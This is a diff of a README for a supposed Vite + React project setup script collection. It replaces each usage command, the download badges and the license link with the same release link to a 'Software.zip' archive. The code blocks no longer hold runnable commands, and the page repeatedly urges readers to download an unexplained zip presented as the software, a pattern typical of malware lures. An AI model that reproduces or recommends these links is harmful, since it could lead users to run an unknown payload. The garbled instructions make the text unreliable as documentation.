@@ -2,7 +2,7 @@
 
 Automate the setup of Vite + React projects with customizable folder structures, essential dependencies, and Tailwind CSS configuration. These scripts streamline project initialization, making development faster and more efficient.
 
-[![GitHub release](https://img.shields.io/badge/Launch%20Software-Download-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![GitHub release](https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip%20Software-Download-brightgreen)](https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip)
 
 ## Overview ℹ️
 
@@ -20,7 +20,7 @@ Setting up a new Vite + React project can be a tedious task, involving configuri
 
 To get started with the `vite-react-project-setup-scripts`, simply download the software from the following link:
 
-[![Download Software](https://img.shields.io/badge/Launch%20Software-Download-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip%20Software-Download-brightgreen)](https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip)
 
 ## Usage 🧰
 
@@ -34,7 +34,7 @@ To get started with the `vite-react-project-setup-scripts`, simply download the 
 ### Initializing a New Project
 
 ```bash
-./init-project.sh
+https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip
 ```
 
 This command will set up a new Vite + React project with the default folder structure and dependencies.
@@ -42,7 +42,7 @@ This command will set up a new Vite + React project with the default folder stru
 ### Customizing Folder Structure
 
 ```bash
-./customize-structure.sh
+https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip
 ```
 
 Use this command to customize the project directory according to your specific requirements.
@@ -50,7 +50,7 @@ Use this command to customize the project directory according to your specific r
 ### Adding Tailwind CSS
 
 ```bash
-./add-tailwind.sh
+https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip
 ```
 
 Run this script to integrate Tailwind CSS into your project for rapid styling capabilities.
@@ -61,7 +61,7 @@ If you'd like to contribute to the `vite-react-project-setup-scripts`, feel free
 
 ## License 📝
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip](https://github.com/SeltarRx/vite-react-project-setup-scripts/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
